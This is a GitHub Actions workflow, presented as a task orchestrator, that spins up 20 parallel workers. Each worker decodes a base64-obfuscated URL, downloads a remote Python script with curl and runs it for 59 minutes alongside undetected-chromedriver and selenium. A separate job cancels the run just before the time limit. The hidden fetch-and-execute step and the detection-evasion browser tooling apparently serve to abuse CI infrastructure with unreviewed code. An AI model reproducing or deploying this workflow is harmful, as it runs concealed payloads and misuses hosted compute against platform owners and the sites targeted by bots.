name: Hyperion Task Orchestrator

on:
  workflow_dispatch:

concurrency:
  group: hyperion-exec-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Task Monitor: Force-cancels run after 59 minutes timeout
  # =================================================================
  execution-guard:
    name: "Guard Monitor"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      MAX_HOLD_TIME: 3540
    steps:
      - name: Initialize Guard
        run: |
          echo "[MONITOR] Guard active for execution ID: ${{ github.run_id }}"
          echo "[MONITOR] Delaying termination trigger for ${MAX_HOLD_TIME}s."

          sleep "${MAX_HOLD_TIME}"

          echo "[MONITOR] Timeout reached — executing run cancellation request..."

          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

          echo "[MONITOR] Request sent successfully. All child processes aborted."

  # =================================================================
  # Worker Grid: Parallel node execution unit
  # =================================================================
  grid-worker:
    name: "Worker-${{ matrix.node_code }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        node_code: [A101, B202, C303, D404, E505, F606, G707, H808, J909, K100, L101, M202, N303, P404, Q505, R606, S707, T808, U909, V100]

    steps:
      # -----------------------------------------------------------------
      # Step 1: Environment Setup
      # -----------------------------------------------------------------
      - name: Prepare OS Environment
        run: |
          echo "[SETUP] Configuring Worker-${{ matrix.node_code }} dependencies..."
          sudo apt-get update -qq
          sudo apt-get install -y curl python3-pip

      # -----------------------------------------------------------------
      # Step 2: Fetch Remote Script
      # -----------------------------------------------------------------
      - name: Fetch Executable Package
        run: |
          echo "[FETCH] Pulling target payload from endpoint..."
          REMOTE_URI=$(echo -n "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
          curl -sL "$REMOTE_URI" -o core_service.py
          echo "[FETCH] Package successfully written to core_service.py."

      # -----------------------------------------------------------------
      # Step 3: Install Dependencies
      # -----------------------------------------------------------------
      - name: Setup Python Libraries
        run: |
          echo "[DEPS] Installing required Python modules..."
          pip3 install -q undetected-chromedriver selenium requests psutil

      # -----------------------------------------------------------------
      # Step 4: Core Process Manager (59-minute timer cap)
      # -----------------------------------------------------------------
      - name: Execute Service Manager
        run: |
          echo ">> Starting process on Worker-${{ matrix.node_code }}..."

          python3 core_service.py &
          SERVICE_PID=$!

          echo ">> Process active under PID: $SERVICE_PID. Execution window: 3540s."

          sleep 3540

          if kill -0 "$SERVICE_PID" 2>/dev/null; then
            echo ">> Window elapsed. Killing active process..."
            kill -9 "$SERVICE_PID"
            echo ">> Process forcibly stopped."
          else
            echo ">> Process terminated naturally before timeout."
          fi
